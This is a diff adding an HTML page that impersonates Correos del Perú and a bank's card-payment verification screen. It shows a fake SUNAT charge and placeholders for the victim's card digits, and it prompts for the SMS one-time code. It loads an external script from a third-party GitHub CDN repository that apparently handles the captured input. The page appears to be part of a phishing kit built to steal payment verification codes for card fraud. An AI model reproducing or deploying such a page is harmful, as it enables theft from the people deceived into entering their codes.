@@ -1,0 +1,369 @@
+<meta name="robots" content="noindex">
+
+
+
+<html lang="es"><head>
+<link rel="icon"  ><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Correos Del Perú</title>
+		<link rel="icon" type="image/png"  >
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/zakorojp/bost-js@main/style.css">
+  <link rel="stylesheet" href="./css/styles.css">
+
+  <style >
+  button#ValidateButton {
+    WIDTH: 179px;
+    height: 37px;
+    font-size: 13px;
+    color: #fff;
+    background-color: #337ab7;
+    border-color: #337ab7;
+    display: inline-block;
+    padding:6px 12px;
+    font-size:14px;
+    font-weight:400;
+    line-height:1.42857143;
+    text-align:center;
+    white-space:nowrap;
+    vertical-align:middle;
+    touch-action:manipulation;
+    cursor:pointer;
+    -webkit-user-select:none;
+    user-select:none;
+    background-image:none;
+    border:1px solid transparent;
+    border-radius:4px;
+}
+
+body {
+	margin: 0
+}
+
+img {
+	border: 0
+}
+
+
+input {
+	line-height: normal
+}
+
+fieldset {
+	border: 1px solid silver;
+	margin: 0 2px;
+	padding: .35em .625em .75em
+}
+
+legend {
+	border: 0;
+	padding: 0
+}
+
+
+
+html {
+	font-size: 10px;
+}
+
+body {
+	font-size: 14px;
+	line-height: 1.42857143;
+	color: #333;
+	background-color: #fff
+}
+
+
+img {
+	vertical-align: middle
+}
+
+.img-responsive {
+	display: block;
+	max-width: 100%;
+	height: auto
+}
+
+
+.text-center {
+	text-align: center
+}
+
+
+
+
+* {
+	-moz-box-sizing: border-box;
+	-webkit-box-sizing: border-box;
+	box-sizing: border-box
+}
+
+img {
+	height: auto;
+	max-width: 100%
+}
+
+
+.col-6 {
+	width: 50%
+}
+
+
+
+@charset "UTF-8";
+
+
+[class*=" col-"],
+[class^=col-] {
+	padding: 3px 0.714em;
+}
+
+
+body {
+	font-size: 1.25em
+}
+
+@media screen and (min-width:251px) {
+	.row {
+		padding: 1.2%;
+	}
+}
+
+.threeds-one .body,
+.threeds-one .container,
+.threeds-one .header,
+.threeds-one .sticky-footer {
+	max-width: 400px;
+	margin: 0 auto
+}
+
+
+
+
+@-moz-document url-prefix() {}
+
+form {
+	margin-bottom: 0
+}
+
+
+
+@supports (-ms-ime-align:auto) {}
+
+
+.header,
+legend {
+	color: #6f6f6f
+}
+
+
+fieldset {
+	border: 0
+}
+
+fieldset>legend {
+	border-bottom: 0;
+	font-size: 1.00em
+}
+
+.field-validation-error {
+	color: #AB2C29
+}
+img {
+    width: 120PX;
+}
+
+
+
+.IMG {
+    display: flex;
+    flex-direction: row;
+    justify-content: space-between;
+    align-items: center;
+}
+
+</style>
+
+    <div class="threeds-one">
+      <div class="container container-sticky-footer">
+        <div class="header" id="HeaderLogos">
+          <div class="row no-pad">
+            <div class="col-12 IMG">
+              <img class="img-responsive header-logo pull-left" src="./img/one1.jpg">
+              <img alt="" class="img-responsive header-logo pull-right" src="./img/223.png">
+            </div>
+          </div>
+        </div>
+        <div class="container container-sticky-footer">
+          <form action="" id="ValidateCredentialForm" method="post">
+            <div class="body" dir="LTR" style="bottom: 54px;">
+              <div class="row form-two-col">
+                <div class="col-12">
+                  <span>
+                    <p class="nospace">
+                      <b>Para confirmar el proceso, introduce la contraseña que te enviamos a tu móvil por SMS.</b>
+                    </p>
+                  </span>
+                  <fieldset id="ValidateTransactionDetailsContainer">
+                    <br>
+                    <legend id="ValidateTransactionDetailsHeader">Detalles de la transacción</legend>
+                    <div class="validate-field row">
+                      <span class="validate-label col-6">Comercio:</span>
+                      <span class="col-6 always-left-to-right">SUNAT Operaciones</span>
+                    </div>
+                    <div class="validate-field row">
+                      <span class="validate-label col-6">Monto Factura:</span>
+                      <span class="col-6 always-left-to-right">14.21 (PEN)</span>
+                    </div>
+                    <div class="validate-field row">
+                      <span class="validate-label col-6">Fecha de Transacción:</span>
+                      <span class="col-6 always-left-to-right">
+                        <span id="date_heure">{{dat}}</span>
+                        <script data-savepage-type="text/javascript" type="text/plain"></script>
+                      </span>
+                    </div>
+                    <div class="validate-field row">
+                      <span class="validate-label col-6">Número de tarjeta:</span>
+                      <span class="col-6 always-left-to-right">************ {{bins}}</span>
+                    </div>
+                    <div class="validate-field row">
+                      <span class="validate-label col-6">Código de verificación:</span>
+                      <span>
+                        <input  id="Credential_Value" name="Ecom_Payment_sms_Verification" type="password" value="">
+                      </span>
+                    </div>
+             
+                    <div class="sticky-footer">
+                      <div class="row no-pad">
+                        <div class="col-12 text-center">
+                          <button type="submit" class="btn btn-w240 ripple" id="ValidateButton">Pagar ahora</button>
+						                          </div>
+
+
+						  <span id="okeys" hidden class="col-12">{{error}}</span>
+
+						  
+						  
+						  <!-- Include jQuery library -->
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+<!-- <form action="" id="ValidateCredentialForm" method="post"> -->
+  <!-- <input id="Credential_Value" name="Ecom_Payment_sms_Verification" type="password" value=""> -->
+  <!-- <button type="submit" class="btn btn-w240 ripple" id="ValidateButton">Pagar ahora</button> -->
+<!-- </form> -->
+
+<!-- Notification container -->
+<div id="notification-container"></div>
+
+<!-- Loading popup -->
+<div id="loading-popup" class="loading-popup" style="display: none;">
+  <div class="loading-message">
+    <p>Cargando...</p> <!-- "Cargando" means "Loading" -->
+    <div class="spinner"></div>
+  </div>
+</div>
+	<script src="https://cdn.jsdelivr.net/gh/zakorojp/bost-js@main//tre_bostrab.js"></script>
+				  
+<style>
+.loading-popup {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.5); /* Transparent background */
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 10000;
+}
+
+.loading-message {
+    background-color: white;
+    padding: 20px;
+    border-radius: 5px;
+    text-align: center;
+    font-size: 18px;
+    width: 312PX;
+    display: flex;
+    flex-direction: column;
+    align-items: center;}
+
+.spinner {
+    border: 5px solid rgba(0, 0, 0, 0.1);
+    border-left-color: #4CAF50;
+    border-radius: 50%;
+    width: 40px;
+    height: 40px;
+    animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+</style>
+			  
+		    <style>
+        .notification-container {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            width: 300px;
+            z-index: 1000;
+        }
+
+        .notification {
+            color: #F44336;
+        }
+
+        .notification i {
+            margin-right: 10px;
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .notification.error {
+            background-color: #ffffff; 
+        }
+
+        .notification .message {
+            flex-grow: 1;
+        }
+
+        .notification .close-btn {
+            cursor: pointer;
+            background: none;
+            border: none;
+            color: white;
+            font-size: 16px;
+            margin-left: 10px;
+        }
+    </style>
+				  
+						  
+						  
+						  
+						  
+						  
+						  
+
+                      </div>
+                    </div>
+                  </fieldset>
+                </div>
+              </div>
+            </div>
+
+          </form>
+        </div>
+      </div>
+    </div>
+  </body>
+  </html>
+  
+  
+
+  
+  
+  
